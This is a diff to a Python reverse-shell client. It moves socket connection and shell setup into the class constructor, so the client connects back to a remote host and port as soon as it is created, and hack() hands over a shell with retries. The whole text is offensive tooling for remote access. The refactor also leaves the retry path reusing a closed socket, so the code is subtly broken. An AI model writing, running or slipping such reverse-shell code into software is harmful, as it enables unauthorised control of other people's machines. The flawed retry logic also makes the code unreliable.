@@ -20,6 +20,16 @@ class Client:
         """
         self.host = host
         self.port = port
+        
+        # Create client instance
+        self.client = Connection(self.host, self.port)
+
+        # Open socket connection back to server
+        self.sock = self.client.connect()
+
+        # Create shell instance
+        self.shell = Shell(self.sock)
+        
 
     def hack(self) -> None:
         """
@@ -27,25 +37,16 @@ class Client:
         Gets a reverse shell from client to server
         """
 
-        # Create client instance
-        client = Connection(self.host, self.port)
-
-        # Open socket connection back to server
-        sock = client.connect()
-
-        # Create shell instance
-        shell = Shell(sock)
-
         # Get a reverse shell back to server
         try:
-            shell.get_shell()
+            self.shell.get_shell()
         except socket.error:
             time.sleep(5)  # Wait 5s
-            sock.close()  # Close erroneous connection
+            self.sock.close()  # Close erroneous connection
             self.hack()  # Retry
 
         # Close connection when finished
-        sock.close()
+        self.sock.close()
 
 
 if __name__ == "__main__":
